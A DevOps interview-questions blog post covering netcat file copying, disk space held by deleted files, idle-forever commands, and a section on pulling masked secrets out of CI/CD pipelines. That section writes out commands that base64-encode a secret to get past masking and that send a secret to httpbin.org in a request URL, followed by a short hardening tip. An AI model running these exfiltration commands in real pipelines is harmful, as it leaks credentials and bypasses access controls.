---
title: "DevOps interview questions - Part 2 📓"
date: 2020-01-19T09:35:31-04:00
author: Stefan Caraiman
categories:
  - devops
  - interview-questions
  - linux
  - blog
tags:
  - linux
  - devops
  - interview
  - debugging
classes: wide
header:
  image: "https://www.onlineinterviewquestions.com/storage/categories/June2018/Devops-Interview-Questions.jpg"
toc: true
toc_label: "Setup of Library Charts"
toc_icon: "cogs"
---

Welcome back to part 2 of the DevOps interview questions blog series. 👋

I won't bore you with any other side details and contexts, so let's get straight into the **questions**


## Copying files between servers without SSH/SCP

This is more of a "thinking outside the box" kind of question, since it's not that widely used in the wild. The only few times when I had come across this was either during other interviews or CTF events, nonetheless it's quite a fun brain teaser.

The most common solution which I came across was by using `nc`. Netcat is a very useful tool available on all unix systems which can come in quite handy.

```console
$ nc -l 2020 > some_binary.bin # On the receiving host
$ nc 192.168.0.10 2020 < some_binary.bin # On the host sending the file
```

Another solution which I saw a colleague use some time ago, was to `base64` encode the file and copy paste the contents of the file to the other server and then decoding the base64 content. Like the good ol' saying, `it ain't stupid if it works` am I right?

## Why is space not being freed from disk after deleting a file?

This question can be asked in a number of ways, like `Why are the df and du commands show different disk usage?` or `I've deleted some files but the amount of free space on the filesystem has not changed.`, but the solution in most cases is the same.

Even if you remove the big pesky log file which was eating away at your storage, the process which was using the said file might still be running and using that file descriptor(remember Part 1 of the blog series).

The solution in this case would be to simply restart/kill the said process, so that the file descriptor handle is gone.

```console
$ lsof +L1 | grep "name-of-delete-log|name-of-the-process"
$ kill -9 ${PROCESS_USING_THE_BIG_FILE}
```

Another solution might be truncating the file via the `proc` file system. Let's pretend the PID number is `2020` and the `fd` is `19`. 

```console
$ echo > /proc/2020/fd/19
```

Thus we do not require a restart of the process, but beware that this solution might have adverse effects on the running process, so make sure this is applicable in your case.

## Ways of doing nothing forever?

What ways can you think of, of making a script do nothing forever?

### `sleep`-ing to infinity

```console
$ sleep infinity
```

The sleep command allows and honors a non-integer number of seconds to sleep in any form acceptable by `strtod`, which can also be `infinity`.

### `tail`-ing of `/dev/null`

```console
$ tail -f /dev/null
```

I think this one is pretty clever, it will simply keep the `stdout` open, but not write anything to it, unlike something like `yes` which also theoretically runs for infinity, but writes to `stdout`, thus not being such an optimal solution of really doing nothing.

### Using the `pause` system call

```pause() causes the calling process (or thread) to sleep until a signal is delivered``` according to the manual pages, which is exactly what we want to achieve. 
The shortest and most elegant version of using the `pause` system call which I found would be by calling it from Perl.

```console
$ perl -MPOSIX -e pause
```

## Ways of exposing a secret environment variable from CI/CD pipeline?

There will be times in the career of any engineer where they will get their hands on a CI/CD system, and they might not have the necessary access to see secret environment variables, such as the user and password to a registry.

This in itself is not an issue, until the moment when you realize that those variables are not setup up correctly on multiple pipelines and you are currently blocked due to the fact that you can't set them up or even see them, since most CI/CD system will mask(or should mask, if it does not do this, maybe you should rethink about why you are using that system) such variables from showing in the STDOUT/output of the pipeline.

For the sake of the question, we will presume we can modify the CI/CD pipeline

P.S: I'm not advocating that any of these are a secure or moral way of getting around the problem and highlighting some security risks, which you should consider on harderning.

### `echo` the variable in `base64`

```console
echo $MY_SECRET_VAR | base64
```

### curl any endpoint that returns the request back

```
curl -X GET "https://httpbin.org/$MY_SECRET_VAR" -H "accept: application/json"
```

This one might not work due to the fact that the `STDOUT` will contain the secret value, but if you have acccess to the access logs of the endpoint that you are sending the request to, you will be able to see it on that side.

### How can you protect against this?

You should make secret environment variables accessible only on protected branches, so that they cannot be exfiltrated.

If the CI/CD permits, you should also block edit of the pipeline definition.


## Conclusion

I think most of the questions described above can be addresed across different seniorities/positions, since the creativity of the answers and the depth of the understading of the issue, can greatly vary from individual to individual, being of great aid in understading how the other person can think and analyze a problem.

Stay close for part 3 of this blog series, happy learning!
